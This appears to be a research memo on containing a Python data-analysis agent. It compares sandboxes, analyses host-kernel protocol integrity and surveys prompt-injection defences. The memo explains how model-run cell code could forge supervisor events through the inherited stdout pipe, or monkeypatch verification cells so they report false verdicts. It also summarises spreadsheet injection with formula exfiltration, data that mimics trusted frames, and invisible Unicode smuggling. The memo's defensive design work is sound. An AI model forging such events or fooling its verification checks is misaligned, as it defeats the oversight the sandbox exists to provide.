# Containment, prompt-injection defence and context engineering for crivo

Research date: 2026-10-23. Read-only: no repo files edited, no paid model calls, no Docker, no secrets read.

**How to read this:**
- A claim with a link and no tag comes from a primary source: the project's own repo or docs, the paper, or the vendor's own post. The date is the date of that source.
- **[high] / [med] / [low]** tag claims that come from secondary sources, or from my own reading or inference.
- Repo metadata (licence, stars, last push, archived) was pulled from the GitHub API on 2026-10-23 (US time; some pushes show as 2026-10-24 UTC).
- **crivo code observations** come from reading `src/crivo/kernel/{supervisor,client}.py` and `src/crivo/verify.py` on `dev` (0994d15). I did not run them.

---

## 0. Top findings (one line each)

1. **The forged-event bug has a concrete, primary-source root cause.**
   - `supervisor.py:129` calls `km.start_kernel()` with no `stdout`, so the kernel inherits the supervisor's stdout, which is the JSON-lines pipe to the host.
   - On POSIX, jupyter_client passes `stdout=None` straight through to Popen ([launcher.py](https://github.com/jupyter/jupyter_client/blob/main/jupyter_client/launcher.py)).
   - On Linux and macOS, ipykernel dup2's fd 1 onto a pipe and echoes every byte to a saved copy of the *original* fd. `sys.stdout.fileno()` returns that copy ([iostream.py](https://github.com/ipython/ipykernel/blob/main/ipykernel/iostream.py), `_watch_pipe_fd`, `fileno`).
   - The host routes any JSON line whose integer `id` matches an open request (`client.py:296-307`).
   - So `os.write(sys.stdout.fileno(), b'{"id": N, ...}\n')`, or `os.system("echo ...")`, should reach the host as a protocol event. [high, from code reading, not executed]
2. **Jupyter's HMAC signing cannot help here.**
   - The key lives in the connection file and in the kernel's own `Session` ([messaging spec v5.5](https://jupyter-client.readthedocs.io/en/latest/messaging.html)).
   - The kernel can therefore sign anything. Signing authenticates peers that hold the key, and the attacker is one of them.
3. **Anthropic's `sandbox-runtime` (srt) is the reference design for 0d** ([repo](https://github.com/anthropics/sandbox-runtime), Apache-2.0, v0.0.81, 2026-10-20, "Beta Research Preview").
   - macOS: generated Seatbelt profiles. Linux: bubblewrap with the network namespace removed, plus seccomp. Windows: an alpha.
   - Network access goes only through host-side HTTP and SOCKS5 proxies with domain allowlists.
   - It is Node/TypeScript, so crivo should port its policy to Python rather than depend on npm.
4. **OpenAI Codex has converged on the same stack** ([linux-sandbox README](https://github.com/openai/codex/tree/main/codex-rs/linux-sandbox), Apache-2.0).
   - Linux: bubblewrap as default plus seccomp. It rejects legacy Landlock for filesystem-restricted policies "because it cannot isolate app-server Unix sockets".
   - macOS: Seatbelt with a closed-by-default `.sbpl` base policy, which crivo can adapt.
5. **sandbox-exec is deprecated but still the only practical CLI-level option on macOS.**
   - The man page says "DEPRECATED" ([man page](https://keith.github.io/xcode-man-pages/sandbox-exec.1.html)).
   - Claude Code, Codex and BoxLite still build on it. The alternatives are App Sandbox (needs an app bundle) and VMs (Apple `container` needs macOS 26, and each container is a VM with 1 GiB of RAM by default).
6. **Language-level sandboxes keep failing.**
   - Pyodide escapes hit seven products at DEF CON 34 (2026-08-10) ([eSecurity Planet](https://www.esecurityplanet.com/threats/def-con-34-one-pyodide-flaw-exposed-seven-products/)) [med].
   - pydantic archived `mcp-run-python`: "there's just no safe way to run Python within pyodide safely" ([README](https://github.com/pydantic/mcp-run-python)).
   - RestrictedPython has had four escape CVEs from 2023 to 2026 [med].
   - PEP 578 says audit hooks are "not sandboxing" ([PEP 578](https://peps.python.org/pep-0578/)).
7. **Prompt-level injection defences don't survive adaptive attacks.**
   - "The Attacker Moves Second" (2025-10-10) bypassed 12 defences, including Spotlighting, Prompt Sandwiching, MetaSecAlign, PromptGuard and MELON, at more than 90% attack success for most ([arXiv 2510.09023](https://arxiv.org/abs/2510.09023)).
   - Human red-teamers beat every defence they tried.
8. **What holds is system-level containment: limit what an injected model can do.**
   - Provable designs: CaMeL solves 77% of AgentDojo tasks against 84% undefended ([arXiv 2503.18813](https://arxiv.org/abs/2503.18813)).
   - Design-pattern principle: "once an LLM agent has ingested untrusted input, it must be constrained" ([arXiv 2506.08837](https://arxiv.org/abs/2506.08837)).
   - Meta's "Rule of Two" (2025-10-31) and the "lethal trifecta" (2025-06-16) say the same thing.
   - The OS sandbox is crivo's main injection defence, not a separate feature.
9. **Injection through spreadsheets is real and already exploited, but there is no tabular injection benchmark.**
   - Field cases: PromptArmor's "CellShock" against Claude for Excel (Nov 2025; hidden text, then exfiltration through an `IMAGE` formula), Ramp Sheets AI (fixed 2026-03-16), the PandasAI CVE-2024-12366 and Vanna.AI CVE-2024-5565 (prompt injection to RCE).
   - AgentDojo and InjecAgent cover tools, not data files. crivo has to build its own traps.
10. **On context, the evidence favours cheap, deterministic, restorable methods.**
    - Observation masking (keep the last 10 observations) halves cost and matches or beats LLM summarisation on SWE-bench Verified ([arXiv 2508.21433](https://arxiv.org/abs/2508.21433)).
    - Summaries made trajectories longer.
    - Anthropic calls tool-result clearing "one of the safest lightest touch forms of compaction" (2025-09-29).
    - RLMs (Zhang, Kraska, Khattab) show that keeping the data in the REPL as a variable, not in the context, scales far past the window. That is crivo's existing design.

---

## 1. Sandboxes for untrusted Python, local-first (2024-2026)

### 1.1 Comparison table

| Option | Platforms | Isolation | Startup | Memory cost | Licence | Maintenance (stars · last push) | Hosts a Jupyter kernel? |
|---|---|---|---|---|---|---|---|
| **srt** `@anthropic-ai/sandbox-runtime` | macOS (Seatbelt), Linux (bwrap + seccomp), Windows alpha | OS-level: FS allowlist, no-network namespace or Seatbelt, proxy egress | Process spawn plus proxy start: ms [med] | Near zero (same process; proxies are small) [med] | Apache-2.0 | 5,986 · 2026-10-23 · v0.0.81 (2026-10-20), beta | Yes, in principle: it wraps any process tree. On macOS, ZMQ over TCP needs `allowLocalBinding`; on Linux, unix sockets are blocked by seccomp [high, my reading] |
| **bubblewrap** (`bwrap`) | Linux | User and mount/pid/net/ipc namespaces; with `--unshare-net` the sandbox gets a private loopback, which bwrap brings up | ~ms [med] | ~0 | LGPL-2.0+ (invoked as a binary, so no linking) | 9,180 · 2026-10-14 · v0.13.1 | Yes. ZMQ over TCP on 127.0.0.1 works inside `--unshare-net`: `network.c` sets up `lo` with 127.0.0.1 and `IFF_UP` ([source](https://github.com/containers/bubblewrap/blob/main/network.c)) |
| **nsjail** | Linux | Namespaces, cgroups (v1 and v2) memory/pids/cpu, rlimits, seccomp-bpf via Kafel | ms | ~0, plus a cgroup cap | Apache-2.0 ("not an official Google product") | 4,171 · 2026-10-02 | Yes (`-Mo` once mode) |
| **firejail** | Linux | Namespaces plus seccomp, **setuid-root** | ms | ~0 | **GPL-2.0** | 7,713 · 2026-10-23 | Yes, but avoid: a setuid helper with a local-root history (CVE-2022-31214, CVSS 7.8, [Ubuntu](https://ubuntu.com/security/CVE-2022-31214)) |
| **Landlock** (LSM) | Linux 5.13+ (TCP rules ABI 4 ≈ 6.7; signals and abstract unix-socket scoping ABI 6 ≈ 6.12; UDP ABI 10) | Unprivileged self-restriction, stackable, inherited by children | ~0 (syscalls) | 0 | Kernel feature; Python binding `landlock` 1.0.0.dev5 (2025-05, immature) | n/a | Yes, as an in-process layer the kernel applies to itself. Some ops can't be restricted: stat, chdir, chmod and others ([kernel docs](https://docs.kernel.org/userspace-api/landlock.html)) |
| **seccomp-bpf** | Linux | Syscall filter (deny `socket`, userns creation, `io_uring`) | ~0 | 0 | libseccomp LGPL-2.1; `pyseccomp` MIT but stale (2021) | libseccomp 932 · 2026-10-07 | A layer, not a sandbox by itself |
| **gVisor** (`runsc`) | Linux only | User-space kernel intercepts syscalls; `--rootless` "mainly only suitable for `runsc do`" ([docs](https://gvisor.dev/docs/user_guide/rootless/)) | ~100s of ms [med] | Tens of MB [low] | Apache-2.0 | 19,764 · 2026-10-24 UTC · release-20261019.0 | Yes. Syscall gaps can break native libraries [med] |
| **Firecracker** | Linux + KVM | Hardware VM; "<125 ms" boot; jailer as a second layer ([site](https://firecracker-microvm.github.io/)) | <125 ms | "<5 MiB overhead per VM" plus guest RAM | Apache-2.0 | 37,583 · 2026-10-24 UTC | Yes, inside the guest; needs a rootfs image with pandas |
| **microsandbox** | macOS Apple silicon, Linux KVM, Windows WHP | libkrun microVM, no daemon; "Average boot times under 100 milliseconds" (M1 guest boot) | <100 ms (claim) | Guest RAM you configure (e.g. 512 MiB) | Apache-2.0 | 8,785 · 2026-10-23 · v0.7.10, "still beta software" | Yes, via an OCI image; not documented |
| **BoxLite** | macOS Apple silicon (12+), Linux x86/arm, WSL2 | VM per box (KVM or Hypervisor.framework) plus seccomp or sandbox-exec, `allow_net` egress list | not stated | Guest RAM | Apache-2.0 | 2,634 · 2026-10-24 UTC · v0.10.8 | Yes, via an OCI image |
| **Apple `container`** | macOS 26 + Apple silicon only | One lightweight Linux VM per container (Virtualization.framework) | "sub-second" [med] | **1 GiB default per VM** ([resource-usage.md](https://github.com/apple/container/blob/main/docs/resource-usage.md)) | Apache-2.0 | 50,860 · 2026-10-24 UTC · 1.6.1 (2026-10-23) | Yes. Same model as `--docker`, without Docker Desktop |
| **Lima** | macOS, Linux | Full Linux VM (VZ or QEMU) | Seconds to tens of seconds [med] | GBs [med] | Apache-2.0 | 22,167 · 2026-10-23 · v2.2.1 | Yes; too heavy for the RAM-limited Mac |
| **E2B** | Cloud (Firecracker); self-hosting the infra is heavy | Hardware VM | ~150 ms [med] | n/a | Apache-2.0 SDK/infra | E2B 14,524 · 2026-10-24 UTC | Yes, `e2b-code-interpreter` runs a stateful notebook-style kernel [med]. **The data leaves the machine.** |
| **Daytona** | Cloud | Containers or VMs | n/a | n/a | — | 71,497 · **archived**: "As of June 2026, Daytona's core development has moved to a private codebase" ([README](https://github.com/daytonaio/daytona)) | Out of scope |
| **Modal Sandboxes** | Cloud | gVisor [med] ([Modal](https://modal.com/resources/run-untrusted-code-safely)) | — | — | Proprietary | — | The data leaves the machine |
| **Pyodide** (+ Deno) | Any | WASM linear memory, but Python can call into the JS host. "Python code running in pyodide can run arbitrary javascript" ([mcp-run-python](https://github.com/pydantic/mcp-run-python)) | ~1 s [low] | 100s of MB [low] | MPL-2.0 | 14,903 · 2026-10-23 · 314.0.7 | No real ipykernel (no ZMQ or threads). Escapes: n8n, Grist, smolagents, langchain-sandbox and others (CVE-2025-68668 9.9, CVE-2026-24002 9.1, …) [med] |
| **wasmtime-py** + WASI CPython | Any | Capability-based WASI | ms | Small | Apache-2.0 WITH LLVM-exception | 542 · 2026-10-22 | No: no pandas or pyarrow native wheels for WASI [med], no kernel |
| **RestrictedPython** | Any | AST rewriting in-process | 0 | 0 | ZPL-2.1 | 747 · 2026-09-27 · 8.5 | No. Escape CVEs: 2023-37271, 2023-41039, 2025-22153, 2026-76825 (`string.Formatter.get_field`, published 2026-09-17) [med, aggregators] |
| **pydantic Monty** | Any | Rust interpreter for a Python subset; capabilities through host functions | 4.5 ms cold start (docs) | Tiny | MIT [med] | Experimental | No: "external library support is not a goal", so no pandas ([pydantic.dev](https://pydantic.dev/docs/monty/)) [med] |
| **Jupyter Enterprise Gateway / gateway_provisioners** | Linux clusters (K8s, YARN, Docker) | Whatever the cluster gives | Seconds | Cluster | BSD-3 | EG 668 · 2026-07-14 · v3.3.0; provisioners 44 · 2026-09-07 | Yes, but server-centric and overkill locally |
| **Jupyter Kernel Gateway** | Any | None (HTTP/WebSocket front to kernels) | — | — | BSD-3 | 562 · **2024-03-12** (3.0.1), effectively dormant | Not a sandbox |

### 1.2 srt in detail (primary: [README](https://github.com/anthropics/sandbox-runtime), fetched 2026-10-23)

- **Model.**
  - Native OS primitives: "`sandbox-exec` on macOS, `bubblewrap` on Linux", plus "proxy-based network filtering". No container is involved.
  - The README calls both filesystem and network isolation required: without file isolation a process can exfiltrate SSH keys, and without network isolation it can escape.
- **Linux.**
  - "The network namespace of the sandboxed process is removed entirely, so all network traffic must go through the proxies running on the host (listening on Unix sockets that are bind-mounted into the sandbox)."
  - Needs `bwrap`, `socat` and `ripgrep`.
  - Ubuntu 24.04+ needs `kernel.apparmor_restrict_unprivileged_userns=0` or an AppArmor profile granting `userns`.
  - seccomp (x64/arm64 prebuilt BPF) does two jobs:
    1. It blocks unix sockets. Without seccomp, sockets are unrestricted, and `allowUnixSockets` paths are ignored on Linux.
    2. It refuses user-namespace creation (`unshare`/`clone` with the userns flag, `setns`, `mount`, `umount2`, `pivot_root`). In the README's words: "Creating a user namespace takes no capability and gives its creator a full capability set over a private copy of the mount tree, from which the binds can be removed."
- **macOS.**
  - Dynamically generated Seatbelt profiles. "The Seatbelt profile allows network traffic only to a specific localhost port where the proxies listen."
  - `allowLocalBinding` opens bind and connect to localhost on any port.
  - `allowAppleEvents` is off by default. Enabling it means "the sandbox no longer provides code-execution isolation".
- **Filesystem.**
  - Reads use deny-then-allow and are **allowed everywhere by default**. Writes are allow-only: "An empty allow list means no write access."
  - Linux globs are narrower: write paths must be literal.
- **Network.**
  - Default deny ("An empty allowedDomains list means no network access"), with deny-list precedence.
  - Resolved-address checks refuse loopback, link-local and metadata addresses.
  - Optional ask-callback and experimental TLS termination.
- **Windows (alpha).**
  - A dedicated `srt-sandbox` account, WFP egress filters and restricted tokens.
  - Schannel-based clients (`curl.exe`, .NET `HttpClient`) fail inside the sandbox.
- **Usage.** A CLI (`srt "cmd"`, `--settings`, `--control-fd 3`) and a TS library (`SandboxManager.wrapWithSandbox`).
- **In Claude Code** ([docs](https://code.claude.com/docs/en/sandboxing)):
  - It "covers shell commands only".
  - It is fail-open unless `failIfUnavailable: true`.
  - Documented limits: domain fronting ("the proxy makes its allow decision from the client-supplied hostname without inspecting TLS"), dangerous `allowUnixSockets` (e.g. `docker.sock`), and `enableWeakerNestedSandbox`.
  - Native Windows runs unsandboxed; WSL2 is recommended.
- **Fit for crivo.**
  - Right shape: it wraps the process tree and keeps stdio pipes, so it fits the JSON-lines supervisor.
  - Wrong runtime: Node and npm for a pip-installed Python tool. Port the policy instead (Apache-2.0, so keep the NOTICE and attribution).
  - crivo needs no egress at all, so the proxy half is unnecessary. That is a simplification: no domain-fronting risk.

### 1.3 Linux building blocks

- **bubblewrap** ([README](https://github.com/containers/bubblewrap)):
  - "not a complete, ready-made sandbox"; the caller defines the policy.
  - Flags crivo needs: `--unshare-net` (private loopback), `--unshare-pid --unshare-ipc --unshare-uts`, `--die-with-parent`, `--new-session` (the README: "If you are not filtering out `TIOCSTI` commands using seccomp filters, argument `--new-session` is needed"), `--ro-bind / /` plus `--bind <workspace>`, `--tmpfs /tmp`, `--clearenv`, `--cap-drop ALL`, `--disable-userns`, `--add-seccomp-fd`, `--json-status-fd`.
  - Codex layers it the same way: `--ro-bind / /`, writable roots with `--bind`, protected subpaths re-bound read-only, then seccomp that blocks network syscalls, `AF_VSOCK` and `io_uring` ([Codex README](https://github.com/openai/codex/tree/main/codex-rs/linux-sandbox)).
- **Ubuntu 23.10+/24.04 AppArmor userns restriction.** On by default in 24.04, it causes `bwrap: setting up uid map: Permission denied` ([Coker, 2024-04-24](https://etbe.coker.com.au/2024/04/24/ubuntu-24-04-bubblewrap/)) [med].
  - The fixes are an AppArmor profile for bwrap or the sysctl.
  - CI on `ubuntu-24.04` runners probably needs `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0` [med].
- **Landlock** ([kernel docs](https://docs.kernel.org/userspace-api/landlock.html)):
  - "Landlock empowers any process, including unprivileged ones, to securely restrict themselves."
  - Stackable, up to 16 layers.
  - ABI 4 added TCP bind/connect by port; ABI 6 added scoping of abstract unix sockets and signals; ABI 9 restricts pathname unix-socket connects; ABI 10 added UDP.
  - It can't restrict `stat`, `chdir`, `chmod`, `chown`, `access`, …
  - Use: a fallback or extra layer applied *by the kernel process to itself* at bootstrap. It works inside Docker or where bwrap can't create a userns, using about 100 lines of ctypes [med].
  - Codex dropped it as primary because older ABIs can't isolate unix sockets.
- **nsjail**: the only Linux tool here with built-in cgroup memory caps (`--cgroup_mem_max`) and `--rlimit_as`. Good on servers; less often installed on desktops [med].
- **landrun** ([repo](https://github.com/Zouuup/landrun), MIT, 2,325 stars, 2026-10-16): a Landlock CLI wrapper. Useful as a reference.

### 1.4 macOS

- **sandbox-exec status.**
  - Man page: "The sandbox-exec command is DEPRECATED. Developers who wish to sandbox an app should instead adopt the App Sandbox feature" ([man](https://keith.github.io/xcode-man-pages/sandbox-exec.1.html)).
  - It still works on macOS 26 Tahoe. A Claude Code issue on 26.2 shows `sandbox-exec -n no-network` working ([issue 26095](https://github.com/anthropics/claude-code/issues/26095)) [med].
  - Gotcha: on a deny-default profile, zsh 5.9 reads `hw.*` sysctls the profile doesn't allow ([Cursor forum](https://forum.cursor.com/t/sandbox-fails-to-initialize-for-zsh-on-macos-26-tahoe-darwin25-zsh-5-9-reads-unwhitelisted-hw-sysctls/161023)) [med]. Codex's base policy allowlists exactly these sysctls.
- **Reusable policy.** Codex's `seatbelt_base_policy.sbpl` ([file](https://github.com/openai/codex/blob/main/codex-rs/sandboxing/src/seatbelt_base_policy.sbpl), Apache-2.0):
  - "inspired by Chrome's sandbox policy"
  - `(deny default)`, `(allow process-fork)`, `(allow signal (target same-sandbox))`, `(allow process-info* (target same-sandbox))`, plus a list of the `sysctl-read` names Python needs.
- **Localhost is the macOS weak spot.**
  - Seatbelt has no network namespace. Allowing loopback so ZMQ over TCP works lets the kernel reach *every* host service on localhost: dev databases, Ollama on 11434, the Docker TCP API [high, my reasoning].
  - Better: start the kernel with jupyter_client's `transport="ipc"` (unix sockets; [connect.py](https://github.com/jupyter/jupyter_client/blob/main/jupyter_client/connect.py) supports `["tcp", "ipc"]`) inside the kernel folder.
  - Then the profile allows only those socket paths and denies all `network*` [med: needs a spike].
- **Alternatives.**
  - App Sandbox needs a signed `.app` bundle and entitlements, so it is not usable for a CLI child process [med].
  - Endpoint Security needs an Apple-issued entitlement [med].
  - Virtualization.framework VMs: Apple `container` (macOS 26 only, 1 GiB default per VM), Lima (heavy), microsandbox/BoxLite (libkrun or HVF, beta).
  - A VM is the only *strong* boundary on macOS. On the owner's RAM-limited Mac it costs what Docker costs today.

### 1.5 In-process and language sandboxes: not a boundary

- **PEP 578 audit hooks**: "This is not sandboxing, as this proposal does not attempt to prevent malicious behavior" ([PEP 578](https://peps.python.org/pep-0578/)). That matches crivo's own finding of pyarrow, ctypes and in-process tampering holes.
- **Pyodide**:
  - DEF CON 34 (Cyera; Tokarev and Pearl; 2026-08-10) found the same flaw in seven products. "restrictions ... did not account for Python's ctypes module and functions exported by Emscripten" [med].
  - pydantic's mcp-run-python is archived for the reason above; langchain-sandbox is archived too.
- **RestrictedPython**: four escape CVEs (2023-2026). The pattern is formatter and frame introspection [med].
- **Conclusion**: for pandas-capable code the floor is an OS sandbox; strong isolation needs a VM.

### 1.6 Jupyter specifics for a sandboxed kernel

- **Where to put the boundary.**
  - crivo's supervisor is already "the only thing that ever talks to" the kernel (`supervisor.py` docstring), and `client.py` already swaps its argv for the Docker path (`transport_argv`).
  - The cheapest 0d seam is to wrap the **supervisor** (with the kernel inside it) in bwrap or sandbox-exec, exactly as Docker wraps it today.
  - On Linux, ZMQ then stays on the sandbox's private loopback.
  - Alternative: a kernelspec whose `argv` is prefixed with the sandbox command, or a `LocalProvisioner` subclass. Provisioners are entry points in `jupyter_client.kernel_provisioners`, configured in kernelspec metadata ([docs](https://jupyter-client.readthedocs.io/en/latest/provisioning.html)).
- **What breaks inside a sandbox** (inference [high]): IPython, matplotlib and font caches write under `$HOME` (`IPYTHONDIR`, `MPLCONFIGDIR`, `XDG_CACHE_HOME`), and `TMPDIR` is shared. Point all of them, and `HOME`, into the kernel folder.
  - The uv-managed interpreter (`~/.local/share/uv/python`) and the project `.venv` must be readable.
- **CurveZMQ.** jupyter_client 8.9.0 (2026-06-05) added ZMQ CURVE transport encryption, and 8.10.0 (2026-08-28) extended it to IPC ([releases](https://github.com/jupyter/jupyter_client/releases)).
  - It protects kernel sockets from *other* local processes, not from the kernel itself.

### 1.7 Memory limits (the 0d memory watchdog)

- **macOS.** `setrlimit` `RLIMIT_AS`/`RLIMIT_DATA` are not enforced. That is from an old Apple note quoted in a Fast Downward issue, and there is no current Apple document ([issue825](https://ai-fast-downward.dmi.unibas.ch/issue825)) [med].
  - Use a polling watchdog on the kernel's process tree: psutil (BSD-3), every 100-250 ms, then kill and emit a `memory_cap` event.
  - macOS compresses memory, so RSS undercounts. `phys_footprint` (via `proc_pid_rusage`) is closer to what the OS charges [med].
- **Linux.**
  - cgroup v2 `MemoryMax` gives a hard cap with no polling race. Unprivileged route: `systemd-run --user --scope -p MemoryMax=2G -p MemorySwapMax=0 …` (memory needs no extra delegation on cgroup v2 per the [Arch wiki](https://wiki.archlinux.org/title/Control_groups)) [med].
  - nsjail and bwrap-in-systemd-scope both work.
  - `RLIMIT_AS` is risky with numpy and pyarrow allocators that reserve large virtual ranges [med]. Prefer cgroup, then the watchdog.
- **None of srt, bwrap or Seatbelt limits memory.** The watchdog is a separate component on every platform.

### 1.8 Windows

- srt Windows support is alpha. Claude Code on native Windows runs unsandboxed and recommends WSL2.
- Codex has a separate Windows sandbox (restricted token and ACLs) [med].
- For crivo: `--docker` or WSL2 on Windows. Don't build a native Windows sandbox in 0d.

---

## 2. Protocol integrity between host and sandbox

### 2.1 What crivo does today (code reading, `dev` @ 0994d15)

- **Host side** (`client.py:152-161`): `Popen(argv, stdin=PIPE, stdout=PIPE, stderr=<supervisor.stderr.log>, env=_child_env(docker))`. The env is an allowlist (good).
- **Host reader** (`client.py:296-307`):
  - `for line in self._proc.stdout: msg = json.loads(line)`; non-JSON lines are skipped.
  - The message goes to `self._queues.get(msg.get("id"))`.
  - Ids come from `itertools.count(1)`, so they are guessable.
- **Supervisor** (`supervisor.py:101-103`): `sys.stdout.write(json.dumps(obj) + "\n")`. At `:129` it calls `self.km.start_kernel()` with no `stdout`/`stderr`, so the kernel inherits fd 1 and fd 2.
- **jupyter_client `launch_kernel`** ([source](https://github.com/jupyter/jupyter_client/blob/main/jupyter_client/launcher.py)): `stdout=None` is passed through, which means inherit. `close_fds=False` is forced only on Windows; on POSIX it adds `start_new_session=True`.
- **ipykernel `OutStream`** ([source](https://github.com/ipython/ipykernel/blob/main/ipykernel/iostream.py)):
  - On Linux and macOS (unless `PYTEST_CURRENT_TEST` is set), `_setup_stream_redirects` runs `os.dup(1)` into `_original_stdstream_copy`, then `os.dup2(pipe, 1)`.
  - `_watch_pipe_fd` forwards each chunk to IOPub **and** runs `os.write(self._original_stdstream_copy, bts)`.
  - `fileno()` returns `_original_stdstream_copy`.
  - Result: any fd-level output from a cell lands on the host's protocol pipe. That covers subprocess output, C-extension printf and `os.write(sys.stdout.fileno(), …)`.
- **Second class of forgery: in-kernel self-report.**
  - `verify.py` builds cells that run *in the model's kernel* and print JSON verdicts (e.g. `admission_cell` prints `{"admitted": True, …}`).
  - A prior cell can monkeypatch `json`, pandas or the helper functions.
  - Transport authentication cannot fix this, because the kernel legitimately produces those bytes. (The repo already has four strict xfails for kernel-side verification bypasses: commit 4835b24.)

### 2.2 What the references say

- **Jupyter wire protocol v5.5** ([spec](https://jupyter-client.readthedocs.io/en/latest/messaging.html)):
  - An HMAC-SHA256 signature over the header, parent header, metadata and content, "used for authentication". The key is "typically the `key` field of a connection file", and an empty key disables it.
  - The kernel holds the key: it is in its connection file and in `get_ipython().kernel.session.key` [high]. So a cell can sign forged IOPub messages too. HMAC stops *third-party* local processes, not the kernel.
- **MCP stdio transport** ([spec](https://modelcontextprotocol.io/specification/latest/basic/transports/stdio)): the server "MUST NOT write anything to its stdout that is not a valid MCP message"; logs go to stderr. This is the same failure class (stray stdout corrupts the stream). The spec relies on discipline, not authentication.
- **Chromium IPC rules** ([mojo.md](https://chromium.googlesource.com/chromium/src/+/main/docs/security/mojo.md), [rule-of-2.md](https://chromium.googlesource.com/chromium/src/+/main/docs/security/rule-of-2.md)):
  - "When receiving data from a less trusted process, treat the data as if it were generated by a malicious adversary."
  - Validate in the privileged process.
  - Don't trust the sender's claims about identity; use what the browser already knows.
  - The sandboxed side returns "a well-formed response back to the caller in an IPC message" with structured types.
- **srt's per-command network list ids** (≥128-bit, unguessable) come with an explicit caveat: they are "attribution, not a boundary between concurrent commands of one session". Nonces attribute; they don't isolate.
- **Linux `/proc` reach.**
  - A same-uid sibling can open `/proc/<pid>/fd/N` of another process. That passes a `PTRACE_MODE_READ_FSCREDS` check, which Yama's `ptrace_scope=1` does not restrict.
  - This access is denied when the target is **non-dumpable** (`prctl(PR_SET_DUMPABLE, 0)`), per the dumpable rule in ptrace access-mode checking ([ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html); [LKML 2016](https://lkml.iu.edu/1606.2/06701.html)) [med-high].
  - So moving the protocol to a private fd is not enough on its own unless the supervisor is also non-dumpable or in another PID namespace.
- **PEP 446** (Python 3.4+): new fds are non-inheritable by default, and `Popen(close_fds=True)` is the default on POSIX. A protocol fd created after the kernel starts, or never marked inheritable, won't leak to the kernel [high].

### 2.3 Design that follows (defence in depth)

1. **Cut the inherited path.** `km.start_kernel(stdout=subprocess.DEVNULL, stderr=<kernel.stderr.log>)`. ipykernel still forwards fd output to IOPub, and the echo now goes to devnull or the log.
2. **Authenticate frames.**
   - The host generates a 32-byte key per session and sends it as the first stdin line (not argv, which is world-readable via `/proc/<pid>/cmdline`, and not env).
   - The supervisor adds `seq` (monotonic) and `mac = HMAC-SHA256(key, seq ‖ canonical_json)` to every event.
   - The host drops lines with a missing or invalid MAC or an out-of-order `seq`, and counts drops in the log.
3. **Make the key unreachable.** On Linux, the supervisor calls `prctl(PR_SET_DUMPABLE, 0)` at start, which blocks `/proc/<sup>/mem` and `/proc/<sup>/fd/*`. With bwrap, also run the kernel in its own `--unshare-pid` sandbox, or keep the supervisor outside it. On macOS, `task_for_pid` on another process needs entitlements or root [med].
4. **Don't trust semantics from the kernel at all.**
   - Verdicts (the referee, admission, verify) run in a **fresh process the model's code never touched**: a short-lived second kernel or `python -I` under the same sandbox.
   - It loads the persisted artifact (parquet) and the fix source, and returns structured results. This is the Chromium "validate in the privileged process" rule, and it is the only fix for in-kernel monkeypatching.

---

## 3. Prompt-injection defences, especially through data and tools

### 3.1 crivo's carriers (inference [high])

Each of these reaches the model:
- column names, sheet names and file names;
- cell text in samples and top values;
- exception messages that quote values;
- the model's own cell outputs that echo data;
- notebook and HTML report text;
- skill text (SKILL.md), if any of it was derived from data.

Two subclasses need explicit traps:
- **Agent Data Injection (ADI).** Data that mimics crivo's own trusted formats: a cell that looks like a finding, a receipt, or a tool-call or tool-result frame. ADI "easily bypasses existing IPI defenses" and found RCE in Claude Code, Codex and Gemini CLI ([arXiv 2607.05120](https://arxiv.org/abs/2607.05120), 2026-07-06).
- **Invisible Unicode tag characters** (U+E0000-E007F, "ASCII smuggling"): invisible to people, read as text by tokenizers ([Robust Intelligence/Cisco, 2024-03-12](https://blogs.cisco.com/ai/understanding-and-mitigating-unicode-tag-prompt-injection)) [med].

### 3.2 Defences (primary sources)

| Defence | Source, date | Mechanism | Evidence |
|---|---|---|---|
| **CaMeL** | Debenedetti et al., Google DeepMind/ETH, [arXiv 2503.18813](https://arxiv.org/abs/2503.18813) v1 2025-03-24, v2 2025-06-24 | Extracts control and data flow from the trusted query; untrusted data can't change program flow; capabilities block exfiltration flows at tool calls | 77% of AgentDojo tasks "with provable security" against 84% undefended. Code: [camel-prompt-injection](https://github.com/google-research/camel-prompt-injection) (Apache-2.0, 409 stars, last push 2025-06-20; "research artifact", "not planning to... maintain") |
| **Design Patterns** | Beurer-Kellner et al. (IBM, Invariant, ETH, Google, Microsoft…), [arXiv 2506.08837](https://arxiv.org/abs/2506.08837) 2025-06-10, v3 2025-06-27 | Six patterns: action-selector, plan-then-execute, LLM map-reduce, dual LLM, code-then-execute, context-minimisation. Ten case studies, including a **SQL agent with a Python interpreter for data analysis** (§4.2) | "unlikely that general-purpose agents can provide meaningful and reliable safety guarantees"; "once an LLM agent has ingested untrusted input, it must be constrained" |
| **Dual LLM** | [Willison, 2023-04-25](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/) | The privileged LLM never sees untrusted text; the quarantined LLM has no tools; values are passed by reference | Basis for CaMeL and FIDES |
| **FIDES** (information-flow control) | Microsoft, [arXiv 2505.23643](https://arxiv.org/abs/2505.23643) 2025-05 | Confidentiality and integrity labels on all data; deterministic policy checks before tool calls; hide and reveal primitives; dynamic taint tracking formalised | AgentDojo "broad range of tasks with security guarantees" |
| **Spotlighting** (delimiting, datamarking, encoding) | Hines et al., Microsoft, [arXiv 2403.14720](https://arxiv.org/abs/2403.14720) 2024-03-20 | Mark untrusted input (interleaved marker tokens, base64) so the model can tell the source | ASR ">50% to <2%" on GPT-family models against **static** attacks. Deployed as the preventive layer in [MSRC, 2025-07](https://www.microsoft.com/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks). Broken by adaptive attacks (>95%, below) |
| **Instruction hierarchy** | Wallace et al., OpenAI, [arXiv 2404.13208](https://arxiv.org/abs/2404.13208) 2024-04-19 | Train the model to ignore lower-privilege instructions | "greatly improves robustness ... even for attack types not seen during training" (GPT-3.5); no hard guarantee |
| **Model training + classifiers** (Anthropic) | [Anthropic, 2025-11-24](https://www.anthropic.com/research/prompt-injection-defenses) | RL on injected content, classifiers scanning untrusted content, human red-teaming | Browser use against a Best-of-N attacker (100 attempts): Opus 4.5 8.0% model-only, 1.4% with improved safeguards. "A 1% attack success rate ... still represents meaningful risk." Later system cards (Opus 4.6 to 5) report 0% in constrained coding environments and higher rates in GUI or browser [low/med, secondary: [WorkOS](https://workos.com/blog/ai-agent-governance-prompt-injection-surface-not-model), [The Decoder](https://the-decoder.com/opus-5-may-have-solved-browser-based-prompt-injection-the-biggest-security-flaw-haunting-ai-agents/)] |
